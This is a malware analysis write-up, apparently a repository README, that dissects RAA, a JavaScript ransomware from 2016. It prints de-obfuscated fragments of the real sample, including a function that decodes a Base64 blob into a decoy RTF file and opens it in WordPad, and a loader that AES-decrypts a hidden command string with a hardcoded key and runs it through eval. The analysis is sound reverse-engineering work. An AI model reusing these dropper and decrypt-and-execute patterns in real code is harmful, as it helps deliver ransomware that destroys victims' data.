# RAA Ransomware JavaScript code analysis

On 14th of June 2016 I found an information about new ransomware called RAA Ransomware. Couple of websites mentioned about it as first ransomware created only by using JavaScript.

Following some links provided by Polish malware analyst **@hasherezade** (https://github.com/hasherezade, https://twitter.com/hasherezade) I've downloaded RAA JavaScript source code from malwr.com (https://malwr.com/analysis/YmE4MDNlMzk2MjY3NDdlYWE1NzFiOTNlYzVhZTlkM2Y/) to take a look its internals.

File **raa.js** contains original content of RAA downloaded from malwr.com, and other files contains source code with some refactoring which I've done during RAA analysis and test runs.


# Analysis

## Extracting parts of code into separate files

**raa.js** file contains 3rd party library, used for some encoding purposes. It's **CryptoJS** library (source code available here https://code.google.com/archive/p/crypto-js/ or GitHub fork here https://github.com/sytelus/CryptoJS).

To keep source code easier to analysis, I've decided to divide **raa.js** into couple of smaller parts. After quick investigation I was able to spot three main parts.

Folder **partials/** contains those parts of code (I keep order of how those fragments exists in original file). Please be aware that I've done a lot of renaming, mostly in **raa_other.js**. Original, obfuscated names you can find in **raa.js**.

- **Crypto.js** contains CryptoJS library
- **raa_other.js** contains other functions, including **zQqUzoSxLQ()**, which seems to be an entry point for the program
- **NWvQtGjjfQX.js** contains only body of function _NWvQtGjjfQX()_, which is quite huge :)


## How RAA JavaScript works

First executable line of script is this assingment:

```javascript
var TBucypWw = YUIMqkFkI();
```

I renamed all found variables and function into something what makes sense and allows to follow them in code in some easy way. This is how previous line and a function just before it looks like after renaming (I just guessed the role of each variable and function to choose particular name):

```javascript
function generateKey() {
    var returnedKey = "";
    var allowedChars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
    for (var i = 0; i < 5; i++)
        returnedKey += allowedChars.charAt(Math.floor(Math.random() * allowedChars.length));
    return returnedKey;
}

// var TBucypWw = YUIMqkFkI();
var __key = generateKey();  // <-- returns xW5Gf
```

This fragment just generates a string which contains five characters. In this writeup, to understand its meaning, how and where it's used, I assigned *xW5Gf* from example above as generated value of **__key** variable.

Next executable fragment is:

```javascript
/* 
// original fragment:
	
var Yvwtdbvd = WScript.Arguments;
if (Yvwtdbvd.length == 0) {
    nYuMHHRx();
    NWvQtGjjfQX();
} else {
    null;
}

*/

var __arguments = WScript.Arguments;


if (__arguments.length == 0) {
    runShell();
    runRansomware();
} else {
    null;
}

```
And here's RAA starts its work. After script checks if there are any arguments passed (now let's assume that there aren't any) **runShell()** (nYuMHHRx()) is executed. Original name of this function is **nYuMHHRx()**, below is my refactored version.

```javascript

function runShell() {
    var b64EncodedString = "e1xydGYxXG..( very long Base64 encoded string )..zIwXHBhcg0KfQ0KBBSDIOBBSDIO==";
    b64EncodedString = b64EncodedString.replace(/BBSDIO/g, "A");
    var clear_b64EncodedString = CryptoJS.enc.Base64.parse(b64EncodedString);
    var clearedString = clear_b64EncodedString.toString(CryptoJS.enc.Utf8);
    clearedString = clearedString.replace(/BBSDIO/g, "A");
    var AdodbStreamObj = new ActiveXObject('ADODB.Stream');
    var WScriptShellObj = WScript.CreateObject("WScript.shell");
    var _saveFolder = WScriptShellObj.SpecialFolders("MyDocuments");
    _saveFolder = _saveFolder + "\\" + "doc_attached_" + __key;
    AdodbStreamObj.Type = 2;
    AdodbStreamObj.Charset = "437";
    AdodbStreamObj.Open();
    AdodbStreamObj.WriteText(clearedString);
    AdodbStreamObj.SaveToFile(_saveFolder);
    AdodbStreamObj.Close();
    var run = "wordpad.exe " + "\"" + _saveFolder + "\"";
    WScriptShellObj.Run(run);
    return 0;
}

```

Let's go through it step by step.

_b64EncodedString_ variable contains very long Base64 encoded string. After a couple of operations with Regular Expressions and CryptoJS methods calls - finally we get RTF document (see **extracted/extracted_rtf.rtf** file)

Next, a file is created with following path:

```
\MyDocuments\doc_atatched_xW5Gf
```

Content of previously generated RTF file is then saved at this path.

Finally, following command is prepared:

```
var run = wordpad.exe "\MyDocuments\doc_atatched_xW5Gf"
```

and executed by Windows Script Host using method Run():

```
WScriptShellObj.Run(run);
```
( reference: https://msdn.microsoft.com/en-us/library/d5fk67ky(v=vs.84).aspx )


Next function is ** NWvQtGjjfQX()** ,I changed its name to runRansomware():

```javascript
function runRansomware() {
    var data_pn = "TVrDiQNMSFE(...)QQURE";

    var cmd = "U2FsdGVkX1/LHQl+aIAo/hXHDEI5YmZZtBIcL5LHq7o+NZyTxtiLAxCsucmN0NBq12nnNJ7XOCyeXqF9xLAkahyIcXx5oc/ic5FRpoj+tZ1qywTZNhPWMlRllGn8O8viVnpXMYHoJr/AphGHfaAOkX8xYjuWhZE8qw1Qw1vQbqdbMlv5RL3xTETBgbylCgyGER91Kef4Q/2YtokOqzg+0BZIjKpdIbr1jQdh8uwp9MKd+Y9dSm1Lz9dl82QJVVbFiBj7N6MEDCw5JESVi5HilHWFEb3eyacdJBxYtKutbAZBOl6aJrLyxKtlxm4o9Cie5+vIPgMtqHEmBWp9GaqYDQlxXXOuTeysry1LXQiCGP7msk2hqAOEhyfxchlAQuma4twTFqHOrPZDECk8hfVJkBvUZg/hl+y4gKbBBLVDEIlKW9AstpcAP6FOcTt/bsS+0fvHnl1fAtMB1AsBSHKhZX/6eMPBGQBQT5fqvyy8MLyMgLOsCt5XHyEgc2ecU1fDokpzzMxMqIPwFZoQDOZSg/pBOMVTyUHuv18WdWI+Q6lppzIUv4mvxEioH7SROiDFqJoHR4EwIdDO0QR82Q4RTTIWO9CfXkC5VnXlEncsU45rIzfEMDv4r1aqoYQlgFr6xjas0/e7+EVCoxhsp4C2Jta43NmC6uLnhjcWRdCcB/8=";
    var key_cmd = "2c025c0a1a45d1f18df9ca3514babdbc";
    var dec_cmd = CryptoJS.AES.decrypt(cmd, key_cmd);
    dec_cmd = CryptoJS.enc.Utf8.stringify(dec_cmd);
    eval(dec_cmd);
    return 0;
}
```

This function executes code, which is decrypted from **data_pn** and **cmd** with **key_cmd** key.



## Links, references


**SophosLabs blog**			
https://nakedsecurity.sophos.com/2016/06/20/ransomware-thats-100-pure-javascript-no-download-required/

**malwr.com**
https://malwr.com/analysis/YmE4MDNlMzk2MjY3NDdlYWE1NzFiOTNlYzVhZTlkM2Y/

**RAA – An entirely new JS ransomware delivering Pony malware**
https://reaqta.com/2016/06/raa-ransomware-delivering-pony/